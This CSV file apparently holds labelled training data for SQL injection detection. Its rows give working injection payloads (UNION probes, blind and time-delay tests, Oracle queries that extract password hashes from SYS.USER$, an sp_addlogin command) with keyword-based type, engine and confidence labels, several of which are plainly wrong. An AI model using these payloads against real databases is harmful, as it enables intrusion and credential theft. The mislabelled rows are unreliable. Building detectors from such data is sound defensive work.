id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
311,"select * from users where id = 1 or 1#""{ union select 'a',version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
314,"select * from users where id = 1 union select @&&@,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
316,"select * from users where id = 1 union select !<@,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
322,"-4860' ) as azyx where 6901 = 6901 union all select 6901,6901,6901,6901,6901#",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
323,"1%' ) ) union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
327,"1%"" ) and 8024 = 3560--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
332,"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
334,-9534%' or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
339,"-3794' ) union all select 2485,2485,2485,2485,2485--",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
341,"-6400 ) ) union all select 4650,4650,4650--",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
343,"1' ) where 9842 = 9842 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
352,"-9508 ) union all select 9950,9950,9950,9950,9950,9950,9950#",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
357,"1' ) as ekjw where 5477 = 5477 union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
360,1%' and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
365,"-4605"" ) union all select 8542,8542,8542,8542,8542,8542,8542,8542--",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
368,"-2312' ) ) ) union all select 5282,5282,5282,5282,5282,5282,5282,5282--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
372,"-8153' ) as qhlb where 4948 = 4948 union all select 4948,4948,4948,4948,4948,4948#",union_based,generic,0.7,UNION-based payload detected. Payload length: 82 chars.,2
375,"1%"" ) and 2006 = 2006",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
376,"-5139 ) ) union all select 3373,3373,3373,3373,3373,3373,3373,3373#",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
378,-9446 ) ) as wmrq where 3705 = 3705 union all select 3705#,union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
381,"1"" ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
388,-2120' ) or 8734 = 8844#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
389,"1"" ) ) as lomw where 9257 = 9257 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 81 chars.,2
390,"1'+ ( select syrz where 7699 = 7699 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
391,1 ) and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
392,"-4984%"" ) ) ) union all select 6980,6980,6980,6980,6980,6980,6980,6980#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
393,"-5224' ) where 1962 = 1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",union_based,generic,0.7,UNION-based payload detected. Payload length: 90 chars.,2
394,"1"" ) ) ) union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
396,"-3721' ) union all select 9050,9050--",union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
397,"-9281 ) where 8363 = 8363 or make_set ( 8220 = 5127,5127 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 61 chars.,2
246,a' --,benign,generic,0.5,. Payload length: 5 chars.,2
253,group by userid having 1 = 1--,benign,generic,0.5,. Payload length: 30 chars.,2
321,"1 ) as clye where 7842 = 7842 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
329,"1"" ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
344,"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and 'uwep' = 'uwep",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
363,"1 ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 8929 = 8929",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
377,"1' ) as rvch where 1863 = 1863 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
382,"1%' ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
398,"1"" ) where 6671 = 6671 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
399,1' ) ) rlike sleep ( 5 ) and ( ( 'iwct' = 'iwct,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
317,"or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
318,""" or sleep ( __TIME__ ) = """,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
319,sleep ( __TIME__ ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
338,"1 where 5466 = 5466 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
351,"1"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""jozh"" = ""jozh",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
353,"1 ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
356,1 ) ) or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
374,"1' ) ) as bedq where 8781 = 8781 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
383,"1%' ) and elt ( 4249 = 4249,7259 ) and ( '%' = '",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
385,"1"" ) ) as klie where 2840 = 2840 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
204,or '7659' = '7659,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 17 chars.,1
212,""" or true--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,1
221,or uid like '%,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 14 chars.,1
239,""" or """"*""",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 9 chars.,1
260,or 'a' = 'a,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,1
271,or x = x,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 8 chars.,1
272,or a = a,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 8 chars.,1
273,or '1' = '1,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,1
275,) ) or ( ( 'x' ) ) = ( ( 'x,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,1
286,) or ( a = a,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 12 chars.,1
287,""" ) ) or ( ( ""x"" ) ) = ( ( ""x",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,1
328,"1"" ) and ( 5452 = 6050 ) *6050 and ( ""ciyc"" like ""ciyc",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 54 chars.,1
337,"-1212%' ) or make_set ( 7588 = 2306,2306 ) and ( '%' = '",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 56 chars.,1
354,"-1064' or make_set ( 6439 = 2937,2937 ) and 'qojd' = 'qojd",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,1
325,1 ) as boed where 6787 = 6787,benign,generic,0.5,. Payload length: 29 chars.,1
326,"1"" where 4281 = 4281",benign,generic,0.5,. Payload length: 20 chars.,1
342,"1"" ) as ztkr where 1532 = 1532",benign,generic,0.5,. Payload length: 30 chars.,1
355,1' ) as rbpx where 1264 = 1264,benign,generic,0.5,. Payload length: 30 chars.,1
361,1' ) as oknw where 8777 = 8777,benign,generic,0.5,. Payload length: 30 chars.,1
362,"1"" where 6501 = 6501",benign,generic,0.5,. Payload length: 20 chars.,1
330,"1', ( select ( case when ( 9443 = 9443 ) then sleep ( 5 ) else 9443* ( select 9443 from information_schema.character_sets ) end ) )",union_based,mysql,1.0,"Signals: 'sleep', 'char', 'case'; UNION-based payload detected; DB: mysql",0
331,"1'|| ( select 'rawn' from dual where 4988 = 4988 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) ||'",union_based,oracle,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected; DB: oracle",0
333,"1"" ) ) as dnhd where 2657 = 2657 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
345,"-4291"" ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""xyhi"" = ""xyhi",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
347,1 ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 9548 = 9548,union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
348,1 ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 6406 = 6406,union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
349,1%' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and '%' = ',union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
350,"1"" ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ""baia"" = ""baia",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
358,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'mfib' = 'mfib",union_based,sqlite,1.0,"Signals: 'randomblob', 'hex'; UNION-based payload detected; DB: sqlite",0
359,1 ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
364,-5742' where 1314 = 1314 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
367,-7535 ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
369,"1%"" ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
371,"select pg_sleep ( 5 ) and ( ""%"" = """,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
373,-7319 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
380,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 'ztmd' = 'ztmd",union_based,oracle,1.0,"Signals: 'dbms_pipe', 'chr', 'dual'; UNION-based payload detected; DB: oracle",0
384,1' ) where 4867 = 4867 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
386,-3859 ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 5846 = 5846,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
387,1 ) ) as pzoo where 8036 = 8036 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
207,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
216,AND 1 = utl_inaddr.get_host_address ( ( SELECT global_name FROM global_name ) ) AND 'i' = 'i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
235,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
236,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
249,"exec sp_addlogin 'name' , 'password'",auth_bypass,mysql,0.9,Signals: 'ord'; Authentication bypass pattern; DB: mysql,0
278,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
290,-- &password =,auth_bypass,mysql,0.9,Signals: 'ord'; Authentication bypass pattern; DB: mysql,0
293,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
305,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
